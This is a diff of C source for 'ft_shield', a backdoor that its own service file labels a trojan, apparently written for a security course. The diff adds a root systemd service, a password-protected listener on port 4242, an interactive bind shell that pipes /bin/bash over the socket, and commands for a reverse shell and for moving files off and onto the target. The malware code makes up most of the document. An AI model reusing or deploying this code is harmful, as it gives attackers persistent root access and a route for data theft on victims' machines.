@@ -1,26 +1,49 @@
 #include "../include/ft_shield.h"
 
-#define SERVICE_FILE_CONTENT  "[Unit]\n"\
-                              "Description=ft_shield trojan\n"\
-                              "\n"\
-                              "[Service]\n"\
-                              "User=root\n"\
-                              "Restart=on-failure\n"\
-                              "RestartSec=5s\n"\
-                              "ExecStart=/usr/bin/ft_shield\n"\
-                              "WorkingDirectory=/\n"\
-                              "StandardOutput=file:/var/log/ft_shield.log\n"\
-                              "StandardError=file:/var/log/ft_shield_error.log\n"\
-                              "\n"\
-                              "[Install]\n"\
-                              "WantedBy=multi-user.target\n"
-#define MAX_CLIENT_CONNECTION_COUNT 3
-#define SERVER_PORT 4242
-#define PASSWORD	1234
+#define SERVICE_FILE_CONTENT	"[Unit]\n"\
+                            	"Description=ft_shield trojan\n"\
+                            	"\n"\
+                            	"[Service]\n"\
+                            	"User=root\n"\
+                            	"Restart=on-failure\n"\
+                            	"RestartSec=5s\n"\
+                            	"ExecStart=/usr/bin/ft_shield\n"\
+                            	"WorkingDirectory=/\n"\
+                            	"StandardOutput=file:/var/log/ft_shield.log\n"\
+                            	"StandardError=file:/var/log/ft_shield_error.log\n"\
+                            	"\n"\
+                            	"[Install]\n"\
+                            	"WantedBy=multi-user.target\n"
+#define FT_SHIELD_COMMANDS	"Commands:\n"\
+							"   help - ?                                :     Shows this help message\n"\
+							"   exit                                    :     Close current client connection\n"\
+							"   shell                                   :     Create a remote shell connection\n"\
+							"   reverse <IPV4 ADDRESS> <PORT>           :     Create a reverse shell connection\n"\
+							"   send <IPV4 ADDRESS> <PORT> <FILE PATH>  :     Send a file from the target machine\n"\
+							"   receive <FILE PATH>                     :     Receive a file in the target machine\n"\
+							"\n"\
+							"INFO:\n"\
+							"   reverse: Create a reverse shell connection to the specified IPV4 address and port.\n"\
+							"            Usage: reverse <IPV4 ADDRESS> <PORT>\n"\
+							"            Note: Ensure that the target machine is listening on the specified port.\n"\
+							"\n"\
+							"   send: Send a file from the target machine to the specified IPV4 address and port.\n"\
+							"         Usage: send <IPV4 ADDRESS> <PORT> <FILE PATH>\n"\
+							"         Note: Ensure that the receiving machine is listening on the specified port.\n"\
+							"\n"\
+							"   receive: Receive a file in the target machine from a remote machine.\n"\
+							"            Usage: receive <FILE PATH>\n"\
+							"            Note: Ensure that the sending machine is connected and sending the file.\n"
+#define	COMMAND_NOT_FOUND	"ft_shield $> Command not found. use 'help' to get the help menu\n"
+#define	MAX_CLIENT_CONNECTION_COUNT	3
+#define	SERVER_PORT	4242
+#define	PASSWORD	"1234"
 
 typedef	struct	client_info
 {
 	bool	is_logged;
+	bool	in_shell;
+	pid_t	shell_pid;
 	int		password_try_count;
 }			t_client_info;
 
@@ -34,6 +57,8 @@ typedef	struct	server
 
 t_server	*g_server;
 
+void	send_msg_to_client(char *msg, int fd);
+
 void	ft_error(char *str)
 {
 	write(2, str, strlen(str));
@@ -46,13 +71,39 @@ void	handle_signal(int sig)
 		exit(0);
 }
 
+void	sigchld_handler(int sig)
+{
+	(void)sig;
+	int		status;
+	pid_t	pid;
+
+	while ((pid = waitpid(-1, &status, WNOHANG)) > 0)
+	{
+		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+		{
+			if (g_server->clients_info[i].shell_pid != pid)
+				continue;
+			g_server->clients_info[i].in_shell = false;
+			g_server->clients_info[i].shell_pid = -1;
+			send_msg_to_client("Shell closed. Returning to server...\n", g_server->clients[i].fd);
+			send_msg_to_client("ft_shield $> ", g_server->clients[i].fd);
+			break;
+		}
+	}
+}
+
 void	setup_signals(void)
 {
 	struct sigaction sa;
+
 	sa.sa_handler = handle_signal;
 	sigemptyset(&sa.sa_mask);
 	sa.sa_flags = 0;
 	if (sigaction(SIGTERM, &sa, NULL) < 0)
+		ft_error("sigaction");
+	sa.sa_handler = sigchld_handler;
+	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
+	if (sigaction(SIGCHLD, &sa, NULL) < 0)
 		ft_error("sigaction");
 	return;
 }
@@ -217,12 +268,81 @@ void	send_msg_to_client(char *msg, int fd)
 	}
 }
 
+char	*trim_whitespaces(char *buff)
+{
+	if (!buff)
+		return NULL;
+	int	first_byte = 0, end_byte;
+	while (isspace(buff[first_byte]))
+		first_byte++;
+	if (!buff[first_byte])
+	{
+		buff[0] = 0;
+		return (buff);
+	}
+	end_byte = strlen(buff)-1;
+	while (end_byte > first_byte && isspace(buff[end_byte]))
+		end_byte--;
+	buff[end_byte+1] = 0;
+	return (&buff[first_byte]);
+}
+
+void	create_remote_shell_session(int fd)
+{
+	send_msg_to_client("Creating a remote shell connection ...\n", fd);
+	pid_t	pid = fork();
+	if (pid < 0)
+	{
+		send_msg_to_client("Failed to create remote shell connection.\n", fd);
+		return;
+	}
+	if (!pid)
+	{
+		close(g_server->server_sock);
+		if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
+			ft_error("dup in reverse shell");
+		execl("/bin/bash", "/bin/bash", "-i", NULL);
+		send_msg_to_client("Failed to create remote shell connection.\n", fd);
+		ft_error("execl");
+	}
+	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+	{
+		if (g_server->clients[i].fd != fd)
+			continue;
+		g_server->clients_info[i].in_shell = true;
+		g_server->clients_info[i].shell_pid = pid;
+		break;
+	}
+
+}
+
+void	handle_client_commands(int fd, char *cmd)
+{
+	char	*user_input = trim_whitespaces(cmd);
+
+	if (!strcmp(user_input, "help") || !strcmp(user_input, "?"))
+		send_msg_to_client(FT_SHIELD_COMMANDS, fd);
+	else if (!strcmp(user_input, "exit"))
+		clear_client_connection(fd);
+	else if (!strcmp(user_input, "shell"))
+		create_remote_shell_session(fd);
+	else if (!strcmp(user_input, "reverse"))
+		create_reverse_shell_connection(fd, user_input);
+	else if (!strcmp(user_input, "send"))
+		send_file_to_client(fd, user_input);
+	else if (!strcmp(user_input, "receive"))
+		recv_file_from_client(fd, user_input);
+	else
+		send_msg_to_client(COMMAND_NOT_FOUND, fd);
+	return;
+}
+
 void	recv_msg_from_client(int idx)
 {
 	char	buff[1024];
 	int		len = 0, client_fd = g_server->clients[idx].fd;
 
-	len = recv(client_fd, buff, 1024, 0);
+	len = recv(client_fd, buff, sizeof(buff), 0);
 	if (len <= 0)
 	{
 		clear_client_connection(client_fd);
@@ -248,13 +368,14 @@ void	recv_msg_from_client(int idx)
 				clear_client_connection(client_fd);
 			}
 		}
+		return;
 	}
-	else
+	if (!g_server->clients_info[idx].in_shell)
 	{
-		if (handle_client_commands(client_fd, buff) != 0)
-			send_msg_to_client("Error: Command failed.\n", client_fd);
+		handle_client_commands(client_fd, buff);
 		send_msg_to_client("ft_shield $> ", client_fd);
 	}
+	return;
 }
 
 void	client_connection()
